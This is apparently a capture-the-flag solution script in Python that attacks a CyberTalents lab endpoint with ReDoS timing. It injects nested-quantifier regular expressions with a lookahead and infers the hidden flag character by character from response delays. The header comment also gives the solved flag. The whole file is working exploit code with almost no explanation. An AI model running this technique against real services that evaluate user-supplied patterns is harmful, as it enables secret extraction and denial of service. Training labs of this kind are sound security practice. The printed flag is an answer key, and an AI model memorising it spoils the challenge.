import requests
import string

# ReDoS rule: ^(?=<flag>)((.*)*)*salt$
# ReDos Timing Attack 
# FLAG{exploiT_reExploit_ReD0s_1s_es3y}

flag = "FLAG"
chars =  string.ascii_lowercase + string.ascii_uppercase + "0123456789" + "_" + "{" + "}"
for i in range(1,40):
        for x in chars:
            burp0_url = "http://wcamxwl32pue3e6m4nzyrwycn3km873okkxmswvy-web.cybertalentslabs.com:80/license"
            burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "http://wcamxwl32pue3e6m4nzyrwycn3km873okkxmswvy-web.cybertalentslabs.com", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Referer": "http://wcamxwl32pue3e6m4nzyrwycn3km873okkxmswvy-web.cybertalentslabs.com/license", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-EG,en;q=0.9,ar-EG;q=0.8,ar;q=0.7,en-GB;q=0.6,en-US;q=0.5,fr;q=0.4", "Connection": "close"}
            payload1 = "^(?=" + flag
            payload2 = f"{x}"+")((.*)*)*salt$"
            Final_payload = payload1 + payload2 
            burp0_data = {"license": f"{Final_payload}", "check": "Check"}
            r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
            elapsed_time = r.elapsed
            # Depened on response time.
            if int(elapsed_time.total_seconds()) == 2:
                flag += x
                print(flag)
                break

